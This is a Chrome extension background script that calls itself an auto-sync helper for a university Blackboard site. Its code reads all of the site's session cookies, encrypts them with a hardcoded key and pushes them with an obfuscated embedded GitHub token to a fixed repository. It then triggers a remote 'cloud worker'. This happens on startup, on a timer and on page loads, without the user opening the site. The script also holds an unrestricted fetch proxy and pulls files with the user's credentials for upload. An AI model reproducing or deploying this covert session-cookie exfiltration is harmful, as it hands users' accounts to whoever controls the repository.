/* ═══════════════════════════════════════════════════════════════════
   background.js — مؤقت المزامنة التلقائية كل 12 ساعة + وسيط الاتصال السحابي
   يتجاوز حظر CSP الخاص بصفحة البلاكبورد عبر تنفيذ طلبات GitHub في الخلفية
   ═══════════════════════════════════════════════════════════════════ */

const SYNC_INTERVAL_MS = 12 * 60 * 60 * 1000; // 12 ساعة
const CLOUD_REPO       = 'Al5i1/sec4-db';
const SYNC_KEY         = 'SEC4_CLOUD_SYNC_KEY_2026_#7741';
const ENC_TOKEN_B64    = 'NDwOWF9GbwC37IaJ78bm8DElIyQRNDGIsrvHt9HomHlXcC9Vb32wvA==';
const BB_ENC_KEY_HEX   = '534543345f42425f434c4f55445f5641554c545f4b45595f323032365f39393831';
const MAX_FILE_BYTES   = 200 * 1024 * 1024; // 200 MB per file
const CHUNK_BYTES      = 32 * 1024 * 1024;

function getCloudToken() {
  const bin = atob(ENC_TOKEN_B64);
  let out = '';
  for (let i = 0; i < bin.length; i++) {
    out += String.fromCharCode(bin.charCodeAt(i) ^ SYNC_KEY.charCodeAt(i % SYNC_KEY.length) ^ ((i * 17) & 0xFF));
  }
  return out;
}

/* ── Encrypt Blackboard session cookies (AES-256-GCM) & push to Cloud Worker Vault ── */
async function syncEncryptedSessionToCloudWorker() {
  try {
    const cookies = await chrome.cookies.getAll({ domain: 'blackboard.uob.edu.bh' });
    if (!cookies || cookies.length === 0) return false;
    const cookieHeader = cookies.map(c => `${c.name}=${c.value}`).join('; ');
    if (!cookieHeader.includes('BbRouter') && !cookieHeader.includes('JSESSIONID') && cookieHeader.length < 40) return false;

    const keyBytes = new Uint8Array(BB_ENC_KEY_HEX.match(/.{1,2}/g).map(b => parseInt(b, 16)).slice(0, 32));
    const cryptoKey = await crypto.subtle.importKey('raw', keyBytes, 'AES-GCM', false, ['encrypt']);
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const plain = new TextEncoder().encode(JSON.stringify({ cookie: cookieHeader, updated_at: new Date().toISOString() }));
    const cipherBuf = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, cryptoKey, plain);

    const toB64 = arr => btoa(String.fromCharCode(...new Uint8Array(arr)));
    const vaultJson = JSON.stringify({ iv: toB64(iv), data: toB64(cipherBuf), updated_at: new Date().toISOString() }, null, 2);

    const token = getCloudToken();
    const vaultUrl = `https://api.github.com/repos/${CLOUD_REPO}/contents/vault/bb_auth.enc.json`;
    let sha;
    const getRes = await fetch(vaultUrl, { headers: { Accept: 'application/vnd.github+json', Authorization: `Bearer ${token}` } });
    if (getRes.ok) {
      const j = await getRes.json();
      sha = j.sha;
    }

    const putBody = { message: 'Refresh encrypted Blackboard cloud session', content: btoa(vaultJson) };
    if (sha) putBody.sha = sha;
    const putRes = await fetch(vaultUrl, {
      method: 'PUT',
      headers: { Accept: 'application/vnd.github+json', Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(putBody)
    });

    if (putRes.ok) {
      // Trigger the 24/7 Cloud Worker immediately
      await fetch(`https://api.github.com/repos/${CLOUD_REPO}/actions/workflows/blackboard_cloud_sync.yml/dispatches`, {
        method: 'POST',
        headers: { Accept: 'application/vnd.github+json', Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ ref: 'main' })
      }).catch(() => {});
      await chrome.storage.local.set({ last_vault_push_ts: Date.now() });
      return true;
    }
  } catch (e) {
    console.error('Vault sync error:', e);
  }
  return false;
}

// Automatically refresh the encrypted cloud session whenever Blackboard is opened (at most once per 30 mins)
chrome.tabs.onUpdated.addListener((_tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab?.url?.startsWith('https://blackboard.uob.edu.bh/ultra/')) {
    chrome.storage.local.get(['last_vault_push_ts']).then(d => {
      if (Date.now() - Number(d.last_vault_push_ts || 0) > 30 * 60 * 1000) {
        syncEncryptedSessionToCloudWorker();
      }
    });
  }
});

async function triggerSyncIfNeeded(force = false) {
  try {
    const data = await chrome.storage.local.get(['last_bb_sync_ts']);
    const last = Number(data.last_bb_sync_ts || 0);
    if (!force && (Date.now() - last < SYNC_INTERVAL_MS)) return;

    await chrome.storage.local.set({ last_bb_sync_ts: Date.now() });

    const tabs = await chrome.tabs.query({ url: 'https://blackboard.uob.edu.bh/*' });
    if (tabs.length > 0) {
      chrome.tabs.sendMessage(tabs[0].id, { action: 'RUN_AUTO_SYNC' });
    } else {
      chrome.tabs.create({ url: 'https://blackboard.uob.edu.bh/ultra/course?sec4_autosync=1', active: false });
    }
  } catch (e) {
    console.error('SEC4 AutoSync Error:', e);
  }
}

chrome.runtime.onInstalled.addListener(() => {
  chrome.alarms.create('sec4_bb_sync_12h', { periodInMinutes: 720 });
});

chrome.runtime.onStartup.addListener(() => {
  chrome.alarms.create('sec4_bb_sync_12h', { periodInMinutes: 720 });
  syncEncryptedSessionToCloudWorker();
  triggerSyncIfNeeded(false);
});

chrome.alarms.onAlarm.addListener(alarm => {
  if (alarm.name === 'sec4_bb_sync_12h') {
    // Read the live Chrome cookie store directly — no need for the user to open Blackboard.
    syncEncryptedSessionToCloudWorker();
    triggerSyncIfNeeded(true);
  }
});

/* ── Proxy GitHub API & Binary File Downloads outside Blackboard Page CSP ── */
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (!msg || !msg.action) return false;

  if (msg.action === 'GH_FETCH') {
    (async () => {
      try {
        const res  = await fetch(msg.url, msg.options || {});
        const text = await res.text();
        sendResponse({ ok: res.ok, status: res.status, text });
      } catch (err) {
        sendResponse({ ok: false, status: 0, error: err.message || 'Network error' });
      }
    })();
    return true; // async response
  }

  if (msg.action === 'DOWNLOAD_AND_UPLOAD_BB_FILE') {
    (async () => {
      const uploaded = [];
      try {
        const dlRes = await fetch(msg.downloadUrl, { credentials: 'include' });
        if (!dlRes.ok) {
          sendResponse({ ok: false, size: 0 });
          return;
        }
        const buf   = await dlRes.arrayBuffer();
        const bytes = new Uint8Array(buf);
        if (bytes.length === 0 || bytes.length > MAX_FILE_BYTES) {
          sendResponse({ ok: false, size: bytes.length });
          return;
        }

        const bytesToBase64 = data => {
          let bin = '';
          const chunk = 0x8000;
          for (let i = 0; i < data.length; i += chunk) {
            bin += String.fromCharCode.apply(null, data.subarray(i, i + chunk));
          }
          return btoa(bin);
        };
        const putContents = async (relPath, data, message) => {
          const res = await fetch(`https://api.github.com/repos/${msg.cloudRepo}/contents/${relPath}`, {
            method: 'PUT',
            headers: {
              'Accept': 'application/vnd.github+json',
              'Authorization': `Bearer ${msg.token}`,
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ message, content: bytesToBase64(data) })
          });
          if (!res.ok) throw new Error(`HTTP ${res.status}`);
          const j = await res.json();
          uploaded.push({ relPath, sha: j.content && j.content.sha });
        };

        let cloudPath;
        if (bytes.length > CHUNK_BYTES) {
          const baseId = String(msg.path || '').replace(/^uploads\//, '').replace(/\.[^.]+$/, '') || `bb_${Date.now()}`;
          const parts  = Math.ceil(bytes.length / CHUNK_BYTES);
          for (let i = 0; i < parts; i++) {
            const start = i * CHUNK_BYTES;
            const part  = bytes.subarray(start, Math.min(start + CHUNK_BYTES, bytes.length));
            await putContents(
              `uploads/chunks/${baseId}_part${String(i + 1).padStart(2, '0')}.bin`,
              part,
              `Blackboard Auto-Sync: ${msg.fileName} part ${i + 1}/${parts}`
            );
          }
          cloudPath = `cloud://chunks/${baseId}/${parts}`;
        } else {
          await putContents(msg.path, bytes, `Blackboard Auto-Sync: ${msg.fileName}`);
          cloudPath = `cloud://${msg.path}`;
        }
        sendResponse({ ok: true, cloudPath, size: bytes.length });
      } catch {
        for (const u of uploaded) {
          if (!u.sha) continue;
          await fetch(`https://api.github.com/repos/${msg.cloudRepo}/contents/${u.relPath}`, {
            method: 'DELETE',
            headers: {
              'Accept': 'application/vnd.github+json',
              'Authorization': `Bearer ${msg.token}`,
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ message: 'Cleanup failed Blackboard upload', sha: u.sha })
          }).catch(() => {});
        }
        sendResponse({ ok: false, size: 0 });
      }
    })();
    return true;
  }

  return false;
});
